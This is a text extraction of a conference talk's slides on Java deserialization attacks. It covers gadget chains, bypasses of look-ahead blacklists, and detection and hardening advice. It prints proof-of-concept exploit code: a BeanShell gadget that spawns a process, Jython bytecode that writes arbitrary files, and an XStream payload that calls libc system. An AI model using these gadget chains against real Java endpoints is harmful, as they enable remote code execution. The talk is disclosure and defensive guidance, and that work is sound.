SESSION ID: ASD-F03
Serial Killer: Silently Pwning  Your Java Endpoints

Alvaro Muñoz
Principal Security Researcher HPE Security For@fy @pwntester
Chris;an Schneider
Whitehat Hacker & Developer Freelancer @cschneider4711

Why this talk?
Java deserializa@on aEacks have been known for years
Rela@vely new gadget in Apache Commons-Collec/ons made the topic also available to mainstream (dev) audience in 2015
Some inaccurate advice to protect your applica@ons is making the rounds
In this talk we'll demonstrate the weakness of this advice by ...
... showing you new RCE gadgets ... showing you bypasses
We'll give advice how to spot this vulnerability and its gadgets during ...
... code reviews (i.e. showing you what to look for) ... pentests (i.e. how to generically test for such issues)
2

What is Java Serializa;on again?
Taking a snapshot of an object graph as a byte stream that can be used to reconstruct the object graph to its original state
Only object data is serialized, not the code The code sits on the ClassPath of the deserializing end
Developers can customize this serializa@on/deserializa@on process
Individual object/state serializa@on  via .writeObject() / .writeReplace() / .writeExternal() methods Individual object/state re-construc@on on deserializing end via .readObject() / .readResolve() / .readExternal() methods (and more)
3

AMack Surface

Usages of Java serializa@on in protocols/formats/products:

RMI (Remote Method Invoca@on) Android

JMX (Java Management Extension) AMF (Ac@on Message Format)

JMS (Java Messaging System)

JSF ViewState

Spring Service Invokers

WebLogic T3

HTTP, JMS, RMI, etc.

...

...

4

Standing on the Shoulder of Giants...
Spring AOP (by Wouter Coekaerts, public exploit: @pwntester in 2011) AMF DoS (by Wouter Coekaerts in 2011) Commons-fileupload (by Arun Babu NeelicaEu in 2013) Groovy (by cpnrodzc7 / @frohoff in 2015) Commons-Collec;ons (by @frohoff and @gebl in 2015) Spring Beans (by @frohoff and @gebl in 2015) Serial DoS (by Wouter Coekaerts in 2015) SpringTx (by @zerothinking in 2016) JDK7 (by @frohoff in 2016) Probably more we are forge7ng and more to come in few minutes ...
5

Java Deserializa;on in a Nutshell

ObjectInputStream Serializable Class Application Code

4. Resolve classes of stream resolveClass()

5. Deserialize objects

1. Get bytes
 2. Initialize ObjectInputStream
 3. Read object from stream

· ois.readObject()

6. Restore object member fields
 · readObject(ObjectInputStream) · readObjectNoData()
7. Eventually replace restored object
 · readResolve()
8. Optionally validate object
 · validateObject()

9. Cast deserialized object to expected type
 10.Use deserialized object

Garbage Collector
11.Call finalize() on GC

6

Triggering Execu;on via "Magic Methods"

ObjectInputStream Serializable Class Application Code

4. Resolve classes of stream resolveClass()

5. Deserialize objects

1. Get bytes
 2. Initialize ObjectInputStream
 3. Read object from stream

· ois.readObject()

6. Restore object member fields
 · readObject(ObjectInputStream) · readObjectNoData()
7. Eventually replace restored object
 · readResolve()
8. Optionally validate object
 · validateObject()

9. Cast deserialized object to expected type
 10.Use deserialized object

Garbage Collector
11.Call finalize() on GC

7

Exploi;ng "Magic Methods"
Abusing "magic methods" of gadgets which have dangerous code:
AEacker controls member fields' values of serialized object Upon deserializa@on .readObject() / .readResolve() is invoked
Implementa@on of this method in gadget class uses aMacker-controlled fields
Aside from the classic ones also lesser-known "magic methods" help:
.validateObject() as part of valida@on (which does not prevent aEacks) .readObjectNoData() upon deserializa@on conflicts .finalize() as part of GC (even ajer errors)
with deferred execu@on bypassing ad-hoc SecurityManagers at deserializa@on
Works also for Externalizable's .readExternal()
8

Exploi;ng "Magic Methods"
But what if there are no  "Magic Methods" on the target's ClassPath that have "dangerous code" for
the aEacker to influence?
9

Proxy with Invoca;onHandler as Catalyzer

Proxy

Interface

method2

method1 method2

Invocation Handler
Custom code

10

Class
field1 field2
... method1 method2

Exploi;ng Invoca;onHandler (IH) Gadgets
AEacker steps upon serializa@on:
AEacker controls member fields of IH gadget, which has dangerous code IH (as part of Dynamic Proxy) gets serialized by aEacker as field on which an innocuous method is called from "magic method" (of class to deserialize)
Applica@on steps upon deserializa@on:
"Magic Method" of "Trigger Gadget" calls innocuous method on an aMacker controlled field This call is intercepted by proxy (set by aEacker as this field) and dispatched to IH
Other IH-like types exist aside from java.lang.reflect.Invoca@onHandler
javassist.u@l.proxy.MethodHandler org.jboss.weld.bean.proxy.MethodHandler
11

New RCE Gadget in BeanShell (CVE-2016-2510)
bsh.XThis$Handler
Serializable Invoca@onHandler Upon func@on intercep@on custom BeanShell code will be called Almost any Java code can be included in the payload In order to invoke the payload a trigger gadget is needed
12

New RCE Gadget in BeanShell (CVE-2016-2510)

1 String payload = "compare(Object foo, Object bar) {" +

2

" new java.lang.ProcessBuilder(new String[]{\"calc.exe\"}).start();return 1;" +

3

"}";

4

5 // Create Interpreter

6 Interpreter i = new Interpreter();

7 i.eval(payload);

8

9 // Create Proxy/InvocationHandler

10 XThis xt = new XThis(i.getNameSpace(), i);

11 InvocationHandler handler = (InvocationHandler) getField(xt.getClass(), "invocationHandler").get(xt);

12 Comparator comparator = (Comparator) Proxy.newProxyInstance(classLoader, new Class<?>[]{Comparator.class}, handler);

13

14 // Prepare Trigger Gadget (will call Comparator.compare() during deserialization)

15 final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);

16 Object[] queue = new Object[] {1,1};

17 setFieldValue(priorityQueue, "queue", queue);

18 setFieldValue(priorityQueue, "size", 2);

13

New RCE Gadget in Jython (CVE pending)
org.python.core.PyFunction
Serializable Invoca@onHandler Upon func@on intercep@on custom python bytecode will be called Only python built-in func@ons can be called
Impor@ng modules is not possible: no os.system() sorry :( S@ll we can read and write arbitrary files (can cause RCE in web app)
In order to invoke the payload a trigger gadget is needed
14

New RCE Gadget in Jython (CVE pending)

1 // Python bytecode to write a file on disk

2 String code =

3

"740000" + // 0 LOAD_GLOBAL

0 (open)

4

"640100" + // 3 LOAD_CONST

1 (<PATH>)

5

"640200" + // 6 LOAD_CONST

2 ('w')

6

"830200" + // 9 CALL_FUNCTION 2

7

"690100" + // 12 LOAD_ATTR

1 (write)

8

"640300" + // 15 LOAD_CONST

3 (<CONTENT>)

9

"830100" + // 18 CALL_FUNCTION 1

10

"01" + // 21 POP_TOP

11

"640000" + // 22 LOAD_CONST

12

"53";

// 25 RETURN_VALUE

13

14 // Helping cons and names

15 PyObject[] consts = new PyObject[]{new PyString(""), new PyString(path), new PyString("w"), new PyString(content)};

16 String[] names = new String[]{"open", "write"};

17

18 PyBytecode codeobj = new PyBytecode(2, 2, 10, 64, "", consts, names, new String[]{}, "noname", "<module>", 0, "");

19 setFieldValue(codeobj, "co_code", new BigInteger(code, 16).toByteArray());

20 PyFunction handler = new PyFunction(new PyStringMap(), null, codeobj);

15

New RCE Gadgets

More of our reported RCE gadgets s;ll being fixed

ZDI ID ZDI-CAN-3511 ZDI-CAN-3510 ZDI-CAN-3497 ZDI-CAN-3588 ZDI-CAN-3592

Affected Vendor(s) Oracle Oracle Oracle Oracle Oracle

Stay tuned!
TwiEer: @pwntester & @cschneider4711 Blog: hEps://hp.com/go/hpsrblog

16

Severity (CVSS) 7.5 7.5 7.5 7.5 7.5

Demo of aMack
Let's take a look at the live demo...
17

Exis;ng Mi;ga;on Advice
Simply remove gadget classes from ClassPath (FoxGlove's advice)
Blacklist & Whitelist based check at ObjectInputStream.resolveClass
Different implementa@ons of this "Lookahead"-Deserializa@on exist:
Use of ObjectInputStream subclass in applica@on's deserializa@on code Agent-based (AOP-like) hooking of calls to ObjectInputStream.resolveClass()
Ad hoc SecurityManager sandboxes during deserializa@on
18

Exis;ng Mi;ga;on Advice
Simply remove gadget classes from ClassPath (FoxGlove's advice)
Not feasible given more and more gadgets becoming available
Blacklist & Whitelist based check at ObjectInputStream.resolveClass
Different implementa@ons of this "Lookahead"-Deserializa@on exist:
Use of ObjectInputStream subclass in applica@on's deserializa@on code Agent-based (AOP-like) hooking of calls to ObjectInputStream.resolveClass()
Ad hoc SecurityManager sandboxes during deserializa@on
19

Exis;ng Mi;ga;on Advice
Simply remove gadget classes from ClassPath (FoxGlove's advice)
Not feasible given more and more gadgets becoming available
Blacklist & Whitelist based check at ObjectInputStream.resolveClass
Different implementa@ons of this "Lookahead"-Deserializa@on exist:
Use of ObjectInputStream subclass in applica@on's deserializa@on code Agent-based (AOP-like) hooking of calls to ObjectInputStream.resolveClass()
Blacklists: Bypasses might exist (in your dependencies or your own code) Whitelists: Difficult to get right & DoS though JDK standard classes possible
Ad hoc SecurityManager sandboxes during deserializa@on
20

Exis;ng Mi;ga;on Advice
Simply remove gadget classes from ClassPath (FoxGlove's advice)
Not feasible given more and more gadgets becoming available
Blacklist & Whitelist based check at ObjectInputStream.resolveClass
Different implementa@ons of this "Lookahead"-Deserializa@on exist:
Use of ObjectInputStream subclass in applica@on's deserializa@on code Agent-based (AOP-like) hooking of calls to ObjectInputStream.resolveClass()
Blacklists: Bypasses might exist (in your dependencies or your own code) Whitelists: Difficult to get right & DoS though JDK standard classes possible
Ad hoc SecurityManager sandboxes during deserializa@on
Execu@on can be deferred a]er deserializa@on: we'll show later how...
21

How did vendors handle this recently?

Vendor / Product Atlassian Bamboo Apache ActiveMQ Apache Batchee
Apache JCS Apache openjpa
Apache Owb Apache TomEE ********** (still to be fixed)

Type of Protection Removed Usage of Serialization
LAOIS Whitelist LAOIS Blacklist + optional Whitelist LAOIS Blacklist + optional Whitelist LAOIS Blacklist + optional Whitelist LAOIS Blacklist + optional Whitelist LAOIS Blacklist + optional Whitelist
LAOIS Blacklist

22

Bypassing LookAhead Blacklists

New gadget type to bypass ad-hoc look-ahead ObjectInputStream blacklist protec@ons:

Can we find a class like:

1 public class NestedProblems implements Serializable {

2 byte[] bytes ... ;

3 ...

4 private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {

5

ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));

6

ois.readObject();

7 }

8 }

During deserializa@on of the object graph, a new immaculate unprotected ObjectInputStream will be instan@ated

AEacker can provide any arbitrary bytes for unsafe deserializa@on

Bypass does not work for cases where ObjectInputStream is instrumented

23

Is this for real or is this just fantasy?


Currently we found many bypass gadgets: JRE: 3 Third Party Libraries:
Apache libraries: 6 Spring libraries: 1 Other popular libraries: 2

Applica@on Servers:
IBM WebSphere: 13 Oracle WebLogic: 3 Apache TomEE: 3 ...

24

Example (has been fixed)

org.apache.commons.scxml2.env.groovy.GroovyContext

1 @SuppressWarnings("unchecked")

2 private void readObject(ObjectInputStream in) throws IOException,ClassNotFoundException {

3 this.scriptBaseClass = (String)in.readObject();

4 this.evaluator = (GroovyEvaluator)in.readObject();

5 this.binding = (GroovyContextBinding)in.readObject();

6 byte[] bytes = (byte[])in.readObject();

7 if (evaluator != null) {

8

this.vars = (Map<String, Object>)

9

new ObjectInputStream(new ByteArrayInputStream(bytes)) {

10

protected Class resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {

11

return Class.forName(osc.getName(), true, evaluator.getGroovyClassLoader());

12

}

13

}.readObject();

14 }

15 else {

16

this.vars = (Map<String, Object>)new ObjectInputStream(new ByteArrayInputStream(bytes)).readObject();

17 }

18 }

25

Now with home delivery

javax.media.jai.remote.SerializableRenderedImage

finalize() > dispose() > closeClient()

1 private void closeClient() {

2

3 // Connect to the data server.

4 Socket socket = connectToServer();

5

6 // Get the socket output stream and wrap an object

7 // output stream around it.

8 OutputStream out = null;

9 ObjectOutputStream objectOut = null;

10 ObjectInputStream objectIn = null;

11 try {

12

out = socket.getOutputStream();

13

objectOut = new ObjectOutputStream(out);

14

objectIn = new ObjectInputStream(socket.getInputStream());

15 } catch (IOException e) { ... }

16 ...

18 try {

19

objectIn.readObject();

20 } catch (IOException e) {

21

sendExceptionToListener(JaiI18N.getString(

22

"SerializableRenderedImage8"),

23

new ImagingException(JaiI18N.getString(

24

"SerializableRenderedImage8"), e));

25 } catch (ClassNotFoundException cnfe) {

26

sendExceptionToListener(JaiI18N.getString(

27

"SerializableRenderedImage9"),

28

new ImagingException(JaiI18N.getString(

29

"SerializableRenderedImage9"), cnfe));

30 }

31 ...

32 }

Bypasses ad-hoc Security Managers

26

Demo of bypass
Let's take a look at the live demo...
27

Is it just Java Serializa;on?
XStream is like Java Serializa@on on steroids
Can deserialize non-serializable classes: --> many more gadgets available
Reported back in 2013: CVE-2013-7285 by Alvaro Munoz (@pwntester) & Abraham Kang (@KangAbraham)
XStream implemented a blacklist/whitelist protec@on scheme  (by default only blocking java.beans.EventHandler)
Unfortunately devs are not fully aware and s@ll use unprotected or only blacklisted XStream instances
e.g.: CVE-2015-5254 in Apache Ac;veMQ and CVE-2015-5344 in Apache Camel
both by @pwntester, @cschneider4711, @maEhias_kaiser
We found many new gadgets during research
Can't be fixed by making them non-serializable. Only fix is applying a whitelist to XStream instance.
... plus most of the ones available for Java serializa@on (e.g.: Commons-Collec@ons, Spring, ...)
28

Exploi;ng JNA

1 <sorted-set>

2 <string>calc.exe</string>

3 <dynamic-proxy>

4 <interface>java.lang.Comparable</interface>

5 <handler class="com.sun.jna.CallbackReference$NativeFunctionHandler">

6

<options />

7

<function class="com.sun.jna.Function">

8

<peer>140735672090131</peer> <!-- depends on target -->

9

<library>

10

<libraryName>c</libraryName>

11

<libraryPath>libc.dylib</libraryPath>

12

</library>

13

<functionName>system</functionName>

14

</function>

15 </handler>

16 </dynamic-proxy>

17 </sorted-set>

29

XStream, can you run readObject()?
XStream works with Java serializa@on so that if a class contains a readObject() or readResolve() method, it will call them as part of the deserializa@on. XStream turns any XStream deserializa@on endpoint into a standard Java one Can we bypass XStream permission system by running code in readObject(), readResolve(), finalize(), ... ?
Any LookAhead bypass gadget will also be valid to bypass XStream blacklist
30

#RSAC
Finding Vulnerabili;es & Gadgets in the Code
SAST Tips

Who Should Check for What?
Check your endpoints for those accep;ng (untrusted)  serialized data Check your code for poten;al gadgets, which could be used in deserializa@on aEacks where your library / framework is used
Also the ClassPath of the app-server can host exploitable gadgets
Problem: "Gadget Space" is too big
Typical app-server based deployments have hundreds of JARs in ClassPath
SAST tools might help for both checks...
Such as HPE Security For@fy or the OpenSource FindSecBugs
32

Finding Direct Deserializa;on Endpoints
Find calls (within your code and your dependencies' code) to:
ObjectInputStream.readObject() ObjectInputStream.readUnshared()
Where InputStream is aEacker controlled. For example:
1 InputStream is = request.getInputStream(); 2 ObjectInputStream ois = new ObjectInputStream(is); 3 ois.readObject();
... and ObjectInputStream is or extends java.io.ObjectInputStream
... but is not a safe one (eg: Commons-io Valida@ngObjectInputStream)
33

High-Level Gadget Categories
Gadget is a class (within target's ClassPath) useable upon deserializa@on to facilitate an aEack, which ojen consists of mul@ple gadgets chained together as a "Gadget Chain". Trigger Gadget is a class with a "Magic Method" triggered during deserializa@on ac@ng upon proxy-able fields, which are aEacker controlled (serializable). Trigger Gadgets ini@ate the execu@on. Bypass Gadget is a class with (preferably) a "Magic Method" triggered during deserializa@on which leads to a "Nested Deserializa@on" with an unprotected OIS of aEacker-controllable bytes. Helper Gadget is a class with glues together other bonds of a gadget chain. Abuse Gadget is a class with a method implemen@ng dangerous func@onality, aEackers want to execute. Need for serializability is lijed when techniques like XStream are used by the target.
34

Finding Gadgets for Fun & Profit

Sinks
Look for interes;ng method calls ... java.lang.reflect.Method.invoke() java.io.File() java.io.ObjectInputStream() java.net.URLClassLoader() java.net.Socket() java.net.URL() javax.naming.Context.lookup() ...

Sources
reached by: java.io.Externalizable.readExternal() java.io.Serializable.readObject() java.io.Serializable.readObjectNoData() java.io.Serializable.readResolve() java.io.ObjectInputValida@on.validateObject() java.lang.reflect.Invoca@onHandler.invoke() javassist.u@l.proxy.MethodHandler.invoke() org.jboss.weld.bean.proxy.MethodHandler.invoke() java.lang.Object.finalize() <clinit> (sta/c ini/alizer)
35

#RSAC
What to Check During Pentests?
DAST Tips

Passive Deserializa;on Endpoint Detec;on
Requests (or any network traffic) carrying serialized Java objects:
Easy to spot due to magic bytes at the beginning: 0xAC 0xED ... Some web-apps might use Base64 to store serialized data  in Cookies, etc.: rO0 ... Be aware that compression could've been applied before Base64
Several Burp-Plugins have been created recently to passively scan  for Java serializa@on data as part of web traffic analysis
Also test for non-web related (binary) traffic with network protocol analyzers
37

Ac;ve Vulnerability Scanning
Some Burp-Plugins ac;vely try to exploit subset of exis@ng gadgets
Either blind through OOB communica@on ("superserial-ac@ve")
For applica@ons running on JBoss
Or @me-based blind via delay ("Java Deserializa@on Scanner")
For gadgets in Apache Commons Collec@ons 3 & 4 And gadgets in Spring 4
Recommenda@on: Adjust ac@ve scanning payloads to not rely on specific gadgets - beEer use a generic delay introduc@on
Such as "SerialDoS" (by Wouter Coekaerts), which is only HashSet based
as of January 2015
38

#RSAC
Hardening Advice

How to Harden Your Applica;ons?
DO NOT DESERIALIZE UNTRUSTED DATA!! When architecture permits it:
Use other formats instead of serialized objects: JSON, XML, etc.
But be aware of XML-based deserializa@on aEacks via XStream, XmlDecoder, etc.
As second-best op@on:
Use defensive deserializa@on with look-ahead OIS with a strict whitelist
Don't rely on gadget-blacklis@ng alone! You can build the whitelist with OpenSource agent SWAT (Serial Whitelist Applica@on Trainer) Prefer an agent-based instrumen@ng of ObjectInputStream towards LAOIS Scan your own whitelisted code for poten@al gadgets
If possible use a SecurityManager as defense-in-depth
40

Apply What You Have Learned Today
Next week you should:
Iden@fy your cri@cal applica@ons' exposure to untrusted data that gets deserialized SAST might help here if codebase is big For already reported vulnerable products, ensure to apply patches
Configure applica@ons with whitelists where possible
In the first three months following this presenta@on you should:
If possible switch the deserializa@on to other formats (JSON, etc.), or Use defensive deserializa@on with a strict whitelist
Within six months you should:
Use DAST to ac@vely scan for deserializa@on vulnerabili@es as part of your process Apply SAST techniques to search for aEacker-helping gadgets Extend this analysis also to non-cri@cal applica@ons
41

#RSAC

Q & A / Thank You !

Alvaro Muñoz @pwntester alvaro.munoz@hpe.com

Chris;an Schneider @cschneider4711 mail@Chris@an-Schneider.net

